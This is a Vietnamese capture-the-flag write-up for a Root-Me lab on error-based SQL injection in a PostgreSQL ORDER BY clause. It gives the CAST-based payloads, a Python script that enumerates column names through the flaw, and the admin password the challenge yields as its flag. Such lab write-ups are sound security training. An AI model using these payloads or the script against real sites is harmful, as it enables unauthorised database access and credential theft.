# [SQL injection - Error](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Error)

## Solutions

Xuất hiện lỗi ở `GET /web-serveur/ch34/?action=contents&order=ASCa`:

```text
ERROR:  syntax error at or near "ASCa"
LINE 1: ...out TO 100; COMMIT;SELECT * FROM contents order by page ASCa
```

Không dùng được `UNION` sau `ORDER BY`, không được dùng dấu `;`

Sử dụng hàm cast() hoặc convert() để xác nhận dựa trên error:

- Kiểm tra version bằng `GET /web-serveur/ch34/?action=contents&order=, (CAST((SELECT version()) AS INT))`:
  - `PostgreSQL 9.5.25 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit`
- Lấy tên các table `GET /web-serveur/ch34/?action=contents&order=, (CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INT))`, chỉ lấy được từng tên tables bằng cách thay đổi OFFSET. Tuy nhiên ở đây, khi thử với OFFSET 0 đã ra ngay một kết quả đáng ngờ:
  - `m3mbr35t4bl3`

- Lấy tên các cột trong table m3mbr35t4bl3 `GET /web-serveur/ch34/?action=contents&order=, (CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'm3mbr35t4bl3') AS INT))`

  - Server trả về lỗi cú pháp ở chỗ `table_name = 'm3mbr35t4bl3'`, không tìm cách khắc phục được

- Đành phải lấy tên tất cả các cột trong tất cả các cột trong database, viết script cho tiện:

```python
import requests

i = -1
while True:
    i += 1
    r = requests.get(f"http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=, (CAST((SELECT column_name FROM information_schema.columns LIMIT 1 OFFSET {i}) AS INT))")
    if "ERROR" in r.text:
        print(r.text[443:-15])
    else:
        break
```

Kết quả:

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ /bin/python /home/kali/Documents/test.py
id
us3rn4m3_c0l
p455w0rd_c0l
em41l_c0l
typname
typnamespace
typowner
...
```

Có thể đoán được `us3rn4m3_c0l` và `p455w0rd_c0l` thuộc bảng `m3mbr35t4bl3`

- Tìm kiếm OFFSET của tài khoản ADMIN trong bảng `GET /web-serveur/ch34/?action=contents&order=, (CAST((SELECT us3rn4m3_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) AS INT))`
  - Kết quả: `ERROR:  invalid input syntax for integer: "admin"` => admin ở OFFSET 0

- Lấy password `GET /web-serveur/ch34/?action=contents&order=, (CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) AS INT))`
  - Kết quả: `ERROR:  invalid input syntax for integer: "1a2BdKT5DIx3qxQN3UaC"`

Flag: `1a2BdKT5DIx3qxQN3UaC`

## References

- <https://www.postgresql.org/docs/current/queries-limit.html>
- <https://www.exploit-db.com/docs/english/44348-error-based-sql-injection-in-order-by-clause-(mssql).pdf>
